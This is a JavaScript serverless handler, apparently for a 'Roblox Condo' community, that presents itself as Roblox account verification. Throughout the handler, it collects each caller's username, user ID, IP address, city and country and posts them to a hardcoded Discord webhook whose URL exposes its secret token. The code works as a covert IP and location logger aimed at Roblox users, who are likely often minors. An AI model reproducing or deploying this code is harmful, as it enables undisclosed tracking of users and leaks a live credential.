const WEBHOOK = 'https://discord.com/api/webhooks/1503404111733719155/NlBoIW_MfwPUkL48xNPJEJNadOJMLhzV4PO1v9O1A8_nKvSDaVCPCqEehxrWZYsjL9Zb';

const COUNTRY_NAMES = {
  BR:'Brasil',PT:'Portugal',US:'Estados Unidos',MX:'México',AR:'Argentina',
  CO:'Colômbia',PE:'Peru',CL:'Chile',UY:'Uruguai',BO:'Bolívia',PY:'Paraguai',
  VE:'Venezuela',EC:'Equador',CR:'Costa Rica',PA:'Panamá',DO:'Rep. Dominicana',
  GT:'Guatemala',HN:'Honduras',SV:'El Salvador',NI:'Nicarágua',CU:'Cuba',
  RU:'Rússia',BY:'Bielorrússia',UA:'Ucrânia',KZ:'Cazaquistão',
  DE:'Alemanha',FR:'França',GB:'Reino Unido',ES:'Espanha',IT:'Itália',
  NL:'Países Baixos',PL:'Polônia',SE:'Suécia',NO:'Noruega',FI:'Finlândia',
  CA:'Canadá',AU:'Austrália',JP:'Japão',KR:'Coreia do Sul',CN:'China',IN:'Índia',
  TR:'Turquia',ID:'Indonésia',PH:'Filipinas',VN:'Vietnã',TH:'Tailândia',
  ZA:'África do Sul',NG:'Nigéria',EG:'Egito',MA:'Marrocos',
};

function flag(code) {
  if (!code || code.length !== 2) return '🌍';
  try { return String.fromCodePoint(...[...code.toUpperCase()].map(c => 0x1F1E6 + c.charCodeAt(0) - 65)); }
  catch(e) { return '🌍'; }
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).end();

  let body = {};
  try { body = req.body || {}; } catch(e) {}

  const { userId, username, days, created } = body;
  const ip = (req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || 'N/A').split(',')[0].trim();
  const country = (req.headers['x-vercel-ip-country'] || '').toUpperCase();
  const city = req.headers['x-vercel-ip-city'] || '';
  const countryName = COUNTRY_NAMES[country] || country || 'Desconhecido';
  const emoji = flag(country);
  const location = city ? `${city}, ${countryName}` : countryName;
  const now = Math.floor(Date.now() / 1000);

  // Fetch Roblox avatar thumbnail
  let avatarUrl = null;
  if (userId) {
    try {
      const thumbRes = await fetch(
        `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png&isCircular=false`
      );
      const thumbData = await thumbRes.json();
      avatarUrl = thumbData?.data?.[0]?.imageUrl || null;
    } catch(e) {}
  }

  // Format creation date
  let createdFormatted = created || 'N/A';
  try {
    createdFormatted = new Date(created).toLocaleDateString('pt-BR', { day:'2-digit', month:'2-digit', year:'numeric' });
  } catch(e) {}

  const payload = {
    embeds: [{
      title: '✅  Conta Roblox Verificada',
      color: 0x22C55E,
      thumbnail: avatarUrl ? { url: avatarUrl } : undefined,
      fields: [
        { name: '👤  Username', value: `**@${username || 'N/A'}**`, inline: true },
        { name: '🆔  User ID', value: `\`${userId || 'N/A'}\``, inline: true },
        { name: '\u200b', value: '\u200b', inline: true },
        { name: '📅  Data de Criação', value: createdFormatted, inline: true },
        { name: '📆  Dias na Conta', value: `**${days || 0}** dias`, inline: true },
        { name: '\u200b', value: '\u200b', inline: true },
        { name: '🌍  IP', value: `\`${ip}\``, inline: true },
        { name: `${emoji}  País`, value: location, inline: true },
        { name: '\u200b', value: '\u200b', inline: true },
        { name: '🕐  Verificado em', value: `<t:${now}:F>`, inline: false },
      ],
      footer: { text: 'Roblox Condo • Logs de Verificação' },
      timestamp: new Date().toISOString(),
    }],
  };

  try {
    await fetch(WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });
    return res.status(200).json({ ok: true });
  } catch(e) {
    return res.status(500).json({ ok: false });
  }
}
